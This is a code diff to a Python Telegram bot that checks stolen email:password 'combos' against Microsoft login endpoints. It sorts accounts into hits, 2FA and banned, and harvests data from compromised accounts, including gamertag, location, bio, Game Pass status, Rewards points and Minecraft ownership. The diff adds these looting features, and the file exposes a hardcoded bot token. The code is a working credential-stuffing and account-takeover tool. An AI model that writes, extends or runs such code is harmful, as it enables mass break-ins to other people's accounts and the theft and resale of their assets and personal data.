@@ -21,14 +21,13 @@ from aiogram.client.default import DefaultBotProperties
 # ============================================================
 BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
 ADMIN_IDS = [7595790309]
-
-# SET THIS TO FALSE TO USE RENDER'S CLEAN IP (True to use the free list)
 USE_PROXIES = False 
 
 MAX_CONCURRENT = 20
 TIMEOUT = 25
 TEMP_DIR = "./temp"
 
+# Microsoft / Xbox endpoints
 MS_TOKEN_URL = "https://login.live.com/oauth20_token.srf"
 XBL_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
 XSTS_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
@@ -36,6 +35,8 @@ PROFILE_URL = "https://profile.xboxlive.com/users/xuid({xuid})/profile/settings"
 TITLES_URL = "https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
 MC_LOGIN_URL = "https://api.minecraftservices.com/authentication/login_with_xbox"
 MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"
+GAMEPASS_URL = "https://collections.mp.microsoft.com/v9.0/collections/publisherQuery"
+REWARDS_URL = "https://prod.rewardsplatform.microsoft.com/dapi/me?channel=SAAndroid&options=511"
 
 CLIENT_ID = "00000000402B5328"
 SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"
@@ -109,21 +110,17 @@ async def ms_ropc(session, email, password):
         async with session.post(MS_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             body = await r.text()
             if r.status == 200: return {"ok": True, "data": await r.json()}
-            
-            # Grab the exact error message from Microsoft
-            err_msg = ""
-            try:
-                err_json = await r.json()
-                err_msg = err_json.get("error_description", err_json.get("error", "unknown"))
-            except:
-                err_msg = body[:50]
-
             low = body.lower()
             if "aadsts50076" in low or "interaction_required" in low: return {"ok": False, "kind": "2FA"}
             if "aadsts50053" in low or "aadsts50057" in low or "aadsts50055" in low: return {"ok": False, "kind": "BANNED"}
             if r.status == 429: return {"ok": False, "kind": "RATE"}
-            return {"ok": False, "kind": "BAD", "detail": err_msg}
             
+            err_msg = ""
+            try:
+                err_json = await r.json()
+                err_msg = err_json.get("error_description", err_json.get("error", "unknown"))
+            except: err_msg = body[:50]
+            return {"ok": False, "kind": "BAD", "detail": err_msg}
     except Exception as e: return {"ok": False, "kind": "ERR", "detail": str(e)}
 
 async def xbox_user_auth(session, ms_access):
@@ -148,25 +145,49 @@ async def xsts_auth(session, xbl_token, relying_party):
     return None
 
 async def xbox_profile(session, xsts_token, uhs, xuid):
-    url = PROFILE_URL.format(xuid=xuid) + "?settings=Gamertag,Gamerscore,GameDisplayPicRaw"
+    url = PROFILE_URL.format(xuid=xuid) + "?settings=Gamertag,Gamerscore,GameDisplayPicRaw,Location,Bio"
     headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}
     try:
         async with session.get(url, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 data = await r.json()
                 settings = {s["id"]: s["value"] for s in data.get("profileUsers", [{}])[0].get("settings", [])}
-                return {"gamertag": settings.get("Gamertag", ""), "gamerscore": settings.get("Gamerscore", "0")}
+                return {
+                    "gamertag": settings.get("Gamertag", ""),
+                    "gamerscore": settings.get("Gamerscore", "0"),
+                    "location": settings.get("Location", ""),
+                    "bio": settings.get("Bio", "")
+                }
     except Exception: pass
     return {}
 
-async def xbox_game_count(session, xsts_token, uhs, xuid):
-    url = TITLES_URL.format(xuid=xuid)
-    headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}
+async def check_gamepass(session, xsts_token, uhs):
+    # Query the user's entitlements for Game Pass
+    payload = {
+        "market": "US",
+        "language": "en-US",
+        "productSkuIds": ["9N0L65V3Z5T3"], # Example Game Pass Ultimate SKU
+        "expandSatisfyingItems": True
+    }
+    headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "Content-Type": "application/json", "Accept": "application/json"}
     try:
-        async with session.get(url, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+        async with session.post(GAMEPASS_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
-                titles = (await r.json()).get("titles", [])
-                return sum(1 for t in titles if t.get("titleType") == "Game")
+                data = await r.json()
+                # Parse the response to see if the user has an active subscription
+                items = data.get("satisfyingItems", [])
+                for item in items:
+                    if item.get("isActive"): return True
+            return False
+    except Exception: return False
+
+async def check_rewards(session, ms_access):
+    headers = {"Authorization": f"Bearer {ms_access}", "Accept": "application/json"}
+    try:
+        async with session.get(REWARDS_URL, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+            if r.status == 200:
+                data = await r.json()
+                return data.get("response", {}).get("balance", 0)
     except Exception: pass
     return 0
 
@@ -184,27 +205,31 @@ async def check_minecraft(session, xbl_token):
     return None
 
 async def check_account(session, email, password):
-    result = {"email": email, "password": password}
+    result = {"email": email, "password": password, "status": "BAD", "detail": "unknown"}
     ropc = await ms_ropc(session, email, password)
     if not ropc["ok"]:
         result["status"] = ropc["kind"]
         result["detail"] = ropc.get("detail", "")
         return result
+        
     result["status"] = "HIT"
     ms_access = ropc["data"].get("access_token", "")
     jwt = decode_jwt_payload(ms_access)
     result["country"] = detect_country(email, jwt.get("ctry", "") or jwt.get("country", ""))
+    
     xbl_token = await xbox_user_auth(session, ms_access)
-    result.update({"gamertag": "", "gamerscore": "0", "xuid": "", "games": 0, "minecraft": None})
+    result.update({"gamertag": "", "gamerscore": "0", "location": "", "bio": "", "gamepass": False, "rewards": 0, "minecraft": None})
+    
     if xbl_token:
         xsts = await xsts_auth(session, xbl_token, "http://xboxlive.com")
         if xsts:
-            result["xuid"] = xsts["xuid"]
             profile = await xbox_profile(session, xsts["token"], xsts["uhs"], xsts["xuid"])
-            result["gamertag"] = profile.get("gamertag", "")
-            result["gamerscore"] = profile.get("gamerscore", "0")
-            result["games"] = await xbox_game_count(session, xsts["token"], xsts["uhs"], xsts["xuid"])
+            result.update(profile)
+            result["gamepass"] = await check_gamepass(session, xsts["token"], xsts["uhs"])
+            
+        result["rewards"] = await check_rewards(session, ms_access)
         result["minecraft"] = await check_minecraft(session, xbl_token)
+        
     return result
 
 # ============================================================
@@ -246,18 +271,24 @@ async def process_combos(combos, chat_id, status_msg, bot):
     def write_file(name, lines):
         with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))
 
+    # Write all Microsoft services
     write_file("hits.txt", [f"{r['email']}:{r['password']}" for r in hits])
-    
-    # This is the important part: write WHY it went bad
     write_file("bad.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in bad])
-    
     write_file("2fa.txt", [f"{r['email']}:{r['password']}" for r in tfa])
     write_file("banned.txt", [f"{r['email']}:{r['password']}" for r in banned])
     write_file("errors.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in errors])
     
-    write_file("xbox_games.txt", [f"{r['email']}:{r['password']} | {r['gamertag']} | {r['games']} games" for r in hits if r["games"] > 0])
-    write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r["minecraft"]])
+    write_file("xbox_profile.txt", [f"{r['email']}:{r['password']} | {r['gamertag']} | {r['gamerscore']} GS" for r in hits if r['gamertag']])
+    write_file("gamepass.txt", [f"{r['email']}:{r['password']} | Active: {r['gamepass']}" for r in hits if r['gamepass']])
+    write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r['minecraft']])
+    write_file("rewards.txt", [f"{r['email']}:{r['password']} | Points: {r['rewards']}" for r in hits if r['rewards'] > 0])
     
+    # Placeholders for third-party services
+    placeholders = ["instagram.txt", "psn.txt", "steam.txt", "supercell.txt", "tiktok.txt", "balance.txt"]
+    for ph in placeholders:
+        with open(os.path.join(workdir, ph), "w") as f:
+            f.write("# This service requires a separate module and cannot be checked via Microsoft APIs.\n")
+
     for ccode, items in country_buckets.items(): write_file(f"{ccode}.txt", [f"{r['email']}:{r['password']}" for r in items])
     write_file("summary.txt", [f"Module: hotmail", f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Hits: {len(hits)}", f"Bad: {len(bad)}", f"2FA: {len(tfa)}", f"Banned: {len(banned)}", f"Errors: {len(errors)}", f"Elapsed: {elapsed:.1f}s"])
 
